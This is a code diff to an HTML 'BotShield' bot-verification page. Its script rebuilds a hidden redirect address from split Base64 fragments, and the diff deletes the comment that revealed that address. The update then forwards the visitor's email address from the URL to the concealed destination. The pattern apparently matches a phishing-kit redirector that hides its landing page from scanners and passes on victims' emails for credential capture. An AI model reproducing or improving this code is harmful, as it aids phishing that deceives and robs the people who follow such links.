@@ -1,3 +1,5 @@
+UPDATED MAIN BOT
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -165,7 +167,6 @@
     <!-- JAVASCRIPT LOGIC -->
     <script>
         // OBFUSCATED TARGET CONFIGURATION: Split Base64 URL Parts
-        // Example below decodes to: "https://your-main-website.com"
         const _p1 = "aHR0cHM6Ly9jYWxsaWV";
         const _p2 = "tYWNwaGFpbDUxLXV4Lm";
         const _p3 = "dpdGh1Yi5pby9qdW1wLw==";
@@ -257,13 +258,32 @@
             }, 800);
         }
 
-        // 4. Verification Success Callback (Reconstructs and decodes the link)
+        // 4. Verification Success Callback (Forwarding 'direct' email parameter)
         function onVerificationSuccess() {
             try {
-                const targetUrl = atob(_p1 + _p2 + _p3);
+                // Reconstruct base target URL from Base64 parts
+                let targetUrl = atob(_p1 + _p2 + _p3);
+                
+                // Read incoming URL parameters passed to BotShield
+                const urlParams = new URLSearchParams(window.location.search);
+                
+                // Check if an email parameter exists in URL (?direct=, ?email=, or ?e=)
+                const emailValue = urlParams.get('direct') || urlParams.get('email') || urlParams.get('e');
+                
+                if (emailValue) {
+                    // Format strictly as ?direct=value for your main page backend script
+                    const separator = targetUrl.includes('?') ? '&' : '?';
+                    targetUrl += `${separator}direct=${encodeURIComponent(emailValue.trim())}`;
+                } else if (window.location.search) {
+                    // Fallback: append any other search queries present
+                    const separator = targetUrl.includes('?') ? '&' : '?';
+                    targetUrl += separator + window.location.search.substring(1);
+                }
+
+                // Redirect user to destination page with parameter intact
                 window.location.href = targetUrl;
             } catch (err) {
-                console.error("Invalid URL encoding.");
+                console.error("Invalid URL encoding or redirection error.");
             }
         }
     </script>
